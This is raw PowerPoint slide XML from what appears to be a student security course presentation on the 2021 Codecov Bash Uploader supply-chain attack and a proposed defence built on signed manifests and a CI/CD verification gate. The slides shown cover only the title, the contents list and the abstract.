        <a:lnSpc>
          <a:spcPct val="80000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPts val="750"/>
        </a:spcBef>
        <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
        <a:buNone/>
        <a:defRPr sz="1050" kern="1200" baseline="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p:bodyStyle>
    <p:other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otherStyle>
  </p:txStyles>
  <p:extLst>
    <p:ext uri="{27BBF7A9-308A-43DC-89C8-2F10F3537804}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="5" orient="horz" pos="2160">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" pos="3840">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5.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.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8.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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0.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.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8.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide1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C5E75B8-16FE-459E-8FEE-76CC5E9BA9CF}" type="datetime1">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>08-09-2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{58CAE0E1-5C16-469C-80A6-45E1950F1503}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="364067" y="3310128"/>
            <a:ext cx="8322733" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Presented By</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="211015" y="897467"/>
            <a:ext cx="8707901" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-IN" sz="36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BCS701 (Information and Network Security)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="36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endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN"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endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0">
              <a:ln w="0"/>
              <a:effectLst>
                <a:outerShdw blurRad="38100" dist="19050" dir="2700000" algn="tl" rotWithShape="0">
                  <a:schemeClr val="dk1">
                    <a:alpha val="40000"/>
                  </a:schemeClr>
                </a:outerShdw>
              </a:effectLst>
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE5F17E-FF89-96F9-B21D-14F8510FE325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272107" y="4617720"/>
            <a:ext cx="4585716" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Under the guidance of</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01DF88FB-6552-969E-6263-9F680DDAE8DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1572768"/>
            <a:ext cx="8412480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-IN" sz="2000" dirty="0">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CCA: Real-World Security Breach Analysis &amp; Cryptographic Solution Design</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{809EDA3D-ED62-9570-6D9B-67B6930F72BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2011680"/>
            <a:ext cx="8412480" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-IN" sz="1600" dirty="0" i="1">
                <a:ln w="0"/>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="19050" dir="2700000" algn="tl" rotWithShape="0">
                    <a:schemeClr val="dk1">
                      <a:alpha val="40000"/>
                    </a:schemeClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Case study: Codecov Bash Uploader supply-chain attack (2021)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2395728"/>
            <a:ext cx="8046720" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2100" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cryptographically Verified Software Supply Chain for Preventing Codecov-Style Supply-Chain Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3675887"/>
            <a:ext cx="6400800" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Name 1 (USN)     Name 2 (USN)     Name 3 (USN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>edit with your team's names and USNs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="4956048"/>
            <a:ext cx="5486400" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Prof. Sonnegowda K</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Assistant Professor, Dept. of ISE, BMSIT&amp;M</a:t>
            </a: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EC0164-0102-408C-A95F-BA5869EBAB0A}" type="datetime1">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>08-09-2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{58CAE0E1-5C16-469C-80A6-45E1950F1503}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-448313" y="862870"/>
            <a:ext cx="3799268" cy="489399"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:no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en-US" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="MS Mincho" pitchFamily="49" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Cambria" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5ACF47DD-C739-1403-D772-26C292EF6574}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720" y="1463040"/>
            <a:ext cx="6949440" cy="4846320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>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Abstract &amp; Objectives</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The Codecov Incident (2021)</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Attack Flow &amp; Problem Statement</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Vulnerabilities &amp; Security Requirements</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Proposed Architecture</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Cryptographic Design</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Key Management</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CI/CD Security Gate</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Attack Simulation &amp; Live Demo</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Testing Results</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Innovation &amp; Industry Relevance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Conclusion &amp; References</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Abstract &amp; Objectives</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1417320"/>
            <a:ext cx="4160520" cy="48920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1481328"/>
            <a:ext cx="3931920" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Abstract</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1847088"/>
            <a:ext cx="3931920" cy="4389120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>In 2021 an attacker used a leaked cloud-storage credential to modify Codecov's </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Bash Uploader</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>. For about two months it silently sent CI secrets to an external server, while being served over valid HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>We built a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Cryptographically Verified Software Supply Chain</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>: SHA-256 + </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ed25519-signed manifests</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>, provenance, a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>root-signed trust policy</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> (rotation / revocation), </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>TLS 1.3</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> distribution and a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>fail-closed CI/CD security gate</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> with a hash-chained audit log.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Result: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>1,000/1,000</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> tampered artifacts blocked (FAR 0 %), ~2.2 ms per verification.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1463040"/>
            <a:ext cx="4023360" cy="107899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Oval 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="1828800"/>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1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="1554480"/>
            <a:ext cx="333756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Analyse</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="1874520"/>
            <a:ext cx="3337560" cy="64008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the documented Codecov incident: vector, timeline, violated requirements</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2679192"/>
            <a:ext cx="4023360" cy="107899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Oval 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="3044952"/>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2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="2770632"/>
            <a:ext cx="333756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Design</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="3090672"/>
            <a:ext cx="3337560" cy="64008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a supply chain where customers verify integrity AND authenticity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="3895344"/>
            <a:ext cx="4023360" cy="107899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Oval 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4892040" y="4261104"/>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3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="3986783"/>
            <a:ext cx="333756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Implement</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
